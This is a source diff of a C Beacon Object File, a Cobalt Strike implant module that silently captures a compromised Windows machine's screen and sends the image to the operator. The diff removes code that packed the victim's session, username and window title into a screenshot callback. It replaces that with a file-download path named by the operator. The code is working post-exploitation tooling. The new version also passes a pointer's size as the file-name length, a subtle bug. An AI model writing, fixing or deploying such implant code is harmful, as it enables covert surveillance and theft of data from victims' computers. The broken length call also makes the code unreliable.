@@ -5,80 +5,8 @@
 #pragma comment(lib, "User32.lib")
 #pragma comment(lib, "Gdi32.lib")
 
-/*Download Screenshot*/
-void downloadScreenshot(char* jpg, int jpgLen, int session, char* windowTitle, int titleLen, char* username, int usernameLen) {
-// Function modified by @BinaryFaultline
-
-// This data helped me figure out the C code to download a screenshot. It was found in the BOF.NET code here: https://github.com/CCob/BOF.NET/blob/2da573a4a2a760b00e66cd051043aebb2cfd3182/managed/BOFNET/BeaconObject.cs
-// Special thanks to CCob doing the research around the BeaconOutput options, making this much easier for me.
-
-// private void WriteSessionUserNameTitle(BinaryWriter bw, int session, string userName, string title) {
-//             bw.Write(session);
-//             bw.Write(title.Length);
-//             bw.Write(Encoding.UTF8.GetBytes(title));
-//             bw.Write(userName.Length);
-//             bw.Write(Encoding.UTF8.GetBytes(userName));
-//         }
-
-// var screenshotCallback = new BinaryWriter(new MemoryStream());
-//             screenshotCallback.Write(jpgData.Length);
-//             screenshotCallback.Write(jpgData);
-//             WriteSessionUserNameTitle(screenshotCallback, session, userName, title);
-    int messageLength = 4 + jpgLen + 4 + 4 + titleLen + 4 + usernameLen;
-    char* packedData = (char*)MSVCRT$malloc(messageLength);
-
-    // //pack on jpgLen/fileSize as 4-byte int second
-    packedData[0] = jpgLen & 0xFF;
-    packedData[1] = (jpgLen >> 8) & 0xFF;
-    packedData[2] = (jpgLen >> 16) & 0xFF;
-    packedData[3] = (jpgLen >> 24) & 0xFF;
-
-    int packedIndex = 4;
-
-    // //pack on the bytes of jpg/returnData
-    for (int i = 0; i < jpgLen; i++) {
-        packedData[packedIndex] = jpg[i];
-        packedIndex++;
-    }
-    
-    //pack on session as 4-byte int first
-    packedData[packedIndex] = session & 0xFF;
-    packedData[packedIndex + 1] = (session >> 8) & 0xFF;
-    packedData[packedIndex + 2] = (session >> 16) & 0xFF;
-    packedData[packedIndex + 3] = (session >> 24) & 0xFF;
-
-    //pack on titleLength as 4-byte int second
-    packedData[packedIndex + 4] = titleLen & 0xFF;
-    packedData[packedIndex + 5] = (titleLen >> 8) & 0xFF;
-    packedData[packedIndex + 6] = (titleLen >> 16) & 0xFF;
-    packedData[packedIndex + 7] = (titleLen >> 24) & 0xFF;
-    
-    packedIndex += 8;
-
-    //pack on the bytes of title
-    for (int i = 0; i < titleLen; i++) {
-        packedData[packedIndex] = windowTitle[i];
-        packedIndex++;
-    }
-
-    //pack on userLength as 4-byte int second
-    packedData[packedIndex] = usernameLen & 0xFF;
-    packedData[packedIndex + 1] = (usernameLen >> 8) & 0xFF;
-    packedData[packedIndex + 2] = (usernameLen >> 16) & 0xFF;
-    packedData[packedIndex + 3] = (usernameLen >> 24) & 0xFF;
-    
-    packedIndex += 4;
-
-    //pack on the bytes of user
-    for (int i = 0; i < usernameLen; i++) {
-        packedData[packedIndex] = username[i];
-        packedIndex++;
-    }
-
-    BeaconOutput(CALLBACK_SCREENSHOT, packedData, messageLength);
-    return;
-}
-
+char downloadfilename[] = "screenshot.bmp";
+/*Download File*/
 void downloadFile(char* fileName, int downloadFileNameLength, char* returnData, int fileSize) {
 
     //Intializes random number generator to create fileId 
@@ -224,7 +152,7 @@ BOOL _print_error(char* func, int line,  char* msg, HRESULT hr) {
 #pragma endregion
 
 
-BOOL SaveHBITMAPToFile(HBITMAP hBitmap, int getOnlyProfile)
+BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName)
 {
     HDC hDC;
     int iBits;
@@ -299,30 +227,7 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, int getOnlyProfile)
     memcpy(((char*)bmpdata) + sizeof(BITMAPFILEHEADER), lpbi, dwDIBSize);
 
 
-    // The CALLBACK_SCREENSHOT takes sessionId, title (window title in default CS screenshot fork&run), username, so we need to populate those
-    // Since the original author didn't do any window enumeration, I am not going through the effort of doing that enumeration, instead it's hardcoded
-    DWORD session = -1;
-    KERNEL32$ProcessIdToSessionId(KERNEL32$GetCurrentProcessId(), &session);
-    char* user;
-    user = (char*)getenv("USERNAME");
-    char title[] = "Right-click this and \"Render BMP\" to view";
-    char fileName[] = "ScreenshotBOF - Downloaded BMP.bmp";
-    
-    int userLength = MSVCRT$_snprintf(NULL,0,"%s",user);
-    int titleLength = MSVCRT$_snprintf(NULL,0,"%s",title);
-    int fileNameLength = MSVCRT$_snprintf(NULL,0,"%s",fileName);
-
-
-    // If the profile is get-only (termination in post client is URI based), download it as a screenshot, otherwise, download it as a file
-
-    if (getOnlyProfile > 0){
-        BeaconPrintf(0x0, "[+] URI post profile detected. Saving bitmap screenshot to Screenshots tab. Note, this takes a little while...");
-        downloadScreenshot((char *)bmpdata, sizeof(BITMAPFILEHEADER) + dwDIBSize, session,(char*)title, titleLength, (char*)user, userLength);
-    } else {
-        BeaconPrintf(0x0, "[+] Post body profile detected. Saving bitmap screenshot to Downloads tab...");
-        downloadFile((char*)fileName, fileNameLength, (char *)bmpdata, sizeof(BITMAPFILEHEADER) + dwDIBSize);
-    }
-    //downloadScreenshot((char *)bmp_bmp, bmp_bmp_len, session,(char*)title, titleLength, (char*)user, userLength);
+    downloadFile((char*)lpszFileName, sizeof(lpszFileName), (char*)bmpdata, (int)(sizeof(BITMAPFILEHEADER) + dwDIBSize));
     //WriteFile(fh, (LPSTR)bmpdata, sizeof(BITMAPFILEHEADER)+ dwDIBSize, &dwWritten, NULL);
 
     /* clean up */
@@ -335,9 +240,10 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, int getOnlyProfile)
 #ifdef BOF
 void go(char* buff, int len) {
     datap  parser;
-    int getOnlyProfile;
+    char * downloadfilename;
     BeaconDataParse(&parser, buff, len);
-    getOnlyProfile = BeaconDataInt(&parser);
+    downloadfilename = BeaconDataExtract(&parser, NULL);
+    BeaconPrintf(0x0, "[*] Tasked beacon to printscreen and save to %s",downloadfilename);
     int x1, y1, x2, y2, w, h;
     // get screen dimensions
     x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
@@ -364,9 +270,11 @@ void go(char* buff, int len) {
     CloseClipboard();
     */
     
-    
-    SaveHBITMAPToFile(hBitmap, getOnlyProfile);
-    BeaconPrintf(0x0, "[+] Screenshot downloaded...");
+    BeaconPrintf(0x0, "[+] PrintScreen saved to bitmap...");
+    LPCSTR filename = (LPCSTR)downloadfilename;
+    SaveHBITMAPToFile(hBitmap, (LPCTSTR)filename);
+
+    //BeaconPrintf(0x0, "[+] Printscreen bitmap saved to %s",downloadfilename);
     // clean up
     SelectObject(hDC, old_obj);
     DeleteDC(hDC);
